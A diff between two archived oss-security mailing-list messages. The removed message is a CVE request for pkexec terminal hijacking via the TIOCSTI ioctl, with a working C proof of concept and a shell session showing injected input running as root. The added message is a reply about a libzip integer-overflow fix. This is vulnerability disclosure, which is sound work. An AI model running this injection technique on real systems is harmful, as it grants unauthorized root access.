@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1183" "Thursday" "25" "February" "2016" "12:15:11" "+0100" "up201407890@alunos.dcc.fc.up.pt" "up201407890@alunos.dcc.fc.up.pt" "<20160225121511.17881tlkjezvzolc@webmail.alunos.dcc.fc.up.pt>" "47" "[oss-security] CVE Request: pkexec tty hijacking via TIOCSTI ioctl" nil nil nil "2" "2016022511:15:11" "[oss-security] CVE Request: pkexec tty hijacking via TIOCSTI ioctl" (number mark "U       up201407890@ Feb 25   47/1183  " thread-indent "\"[oss-security] CVE Request: pkexec tty hijacking via TIOCSTI ioctl\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["812" "Monday" "23" "March" "2015" "22:45:12" "+0100" "Thomas Klausner" "tk@giga.or.at" "<20150323214512.GB22688@danbala.tuwien.ac.at>" "25" "Re: [oss-security] CVE Request: ZIP Integer Overflow leads to writing past heap boundary" nil nil nil "3" "2015032321:45:12" "[oss-security] CVE Request: ZIP Integer Overflow leads to writing past heap boundary" (number mark "        tk@giga.or.a Mar 23   25/812   " thread-indent "\"Re: [oss-security] CVE Request: ZIP Integer Overflow leads to writing past heap boundary\"\n") "<CA+KTh2wQ2x4mx5LniqyjMB98kTsHO4N9d6gWoowbEehn15XSrg@mail.gmail.com>" ("<CA+KTh2x04-9kdmsMhRcXUOD7XgQ+mJG-XEMe8q7ebZSUjOV6qQ@mail.gmail.com>" "<20150318191306.GA3736@zoidberg>" "<sfid-H20150318-203137-+050.23-1@spamfilter.osbf.lua>" "<CA+KTh2wQ2x4mx5LniqyjMB98kTsHO4N9d6gWoowbEehn15XSrg@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 7263 invoked by uid 550); 25 Feb 2016 14:11:23 -0000
+Received: (qmail 32419 invoked by uid 550); 23 Mar 2015 21:45:24 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,68 +11,46 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 16035 invoked from network); 25 Feb 2016 11:16:30 -0000
-Message-ID: <20160225121511.17881tlkjezvzolc@webmail.alunos.dcc.fc.up.pt>
-Date: Thu, 25 Feb 2016 12:15:11 +0100
-From: up201407890@alunos.dcc.fc.up.pt
-To: oss-security@lists.openwall.com
-Cc: cve-assign@mitre.org
+Received: (qmail 32401 invoked from network); 23 Mar 2015 21:45:24 -0000
+Message-ID: <20150323214512.GB22688@danbala.tuwien.ac.at>
+References: <CA+KTh2x04-9kdmsMhRcXUOD7XgQ+mJG-XEMe8q7ebZSUjOV6qQ@mail.gmail.com>
+ <20150318191306.GA3736@zoidberg>
+ <sfid-H20150318-203137-+050.23-1@spamfilter.osbf.lua>
+ <CA+KTh2wQ2x4mx5LniqyjMB98kTsHO4N9d6gWoowbEehn15XSrg@mail.gmail.com>
 MIME-Version: 1.0
-Content-Type: text/plain;
-	charset=ISO-8859-1;
-	DelSp="Yes";
-	format="flowed"
+Content-Type: text/plain; charset=us-ascii
 Content-Disposition: inline
-Content-Transfer-Encoding: quoted-printable
-User-Agent: Internet Messaging Program (IMP) H3 (4.2)
-X-Virus-Scanned: amavisd-new at alunos.dcc.fc.up.pt
-Subject: [oss-security] CVE Request: pkexec tty hijacking via TIOCSTI ioctl
+In-Reply-To: <CA+KTh2wQ2x4mx5LniqyjMB98kTsHO4N9d6gWoowbEehn15XSrg@mail.gmail.com>
+Cc: Timo Warns <Timo.Warns@gmail.com>
+Date: Mon, 23 Mar 2015 22:45:12 +0100
+From: Thomas Klausner <tk@giga.or.at>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] CVE Request: ZIP Integer Overflow leads to
+ writing past heap boundary
+To: oss-security@lists.openwall.com
 
-Bug report to redhat:
-https://bugzilla.redhat.com/show_bug.cgi?id=3D1300746
+On Thu, Mar 19, 2015 at 08:31:14AM +1300, Emmanuel Law wrote:
+> Yup we realised that and notified libzip.
+> On 19/03/2015 8:05 am, "Timo Warns" <Timo.Warns@gmail.com> wrote:
+> 
+> > On 2015-03-18, Emmanuel Law wrote:
+> > > found an integer overflow in PHP. When processing a malform zip file with
+> > > many entires, it leads to a heap overflow.
+> > >
+> > > Affected Version <= PHP 5.6.6
+> > > Bug Report: https://bugs.php.net/bug.php?id=69253
+> > > Patch:
+> > >
+> > https://github.com/php/php-src/commit/ef8fc4b53d92fbfcd8ef1abbd6f2f5fe2c4a11e5
+> >
+> > This looks like it may also affect libzip upstream
+> > (http://hg.nih.at/libzip/file/fa78ab51417f/lib/zip_dirent.c)
+> >
+> > Was upstream (in copy) informed about the issue?
 
+We have since fixed this:
 
-When executing a program via "pkexec --user nonpriv program" the=20=20
-nonpriv session can
-escape to the parent session by using the TIOCSTI ioctl to push=20=20
-characters into the
-terminal's input buffer, allowing privilege escalation.
-This issue has been fixed in "su" by calling setsid() and in "sudo" by=20=20
-using the
-"use_pty" flag.
+http://hg.nih.at/libzip/rev/9f11d54f692e
 
-# cat test.c
-#include <sys/ioctl.h>
-
-int main()
-{
-  char *cmd =3D "id\n";
-  while(*cmd)
-   ioctl(0, TIOCSTI, cmd++);
-}
-
-# gcc test.c -o test
-# id saken
-uid=3D1000(saken) gid=3D1000(saken) groups=3D1000(saken)
-
-# pkexec --user saken ./test ----> last command i type in
-id
-# id ----> did not type this
-uid=3D0(root) gid=3D0(root) groups=3D0(root)
-
-
-This is similar to CVE-2005-4890 and CVE-2013-6409
-
-I'd like to request a CVE for this issue.
-
-PS: I don't believe any of the previous mentions of fixes for "su" and
-"sudo" would work here, since executing a shell via pkexec would make it not
-have job control.
-
-Thanks,
-Federico Bento
-
-----------------------------------------------------------------
-This message was sent using IMP, the Internet Messaging Program.
-
+Thanks!
+ Thomas
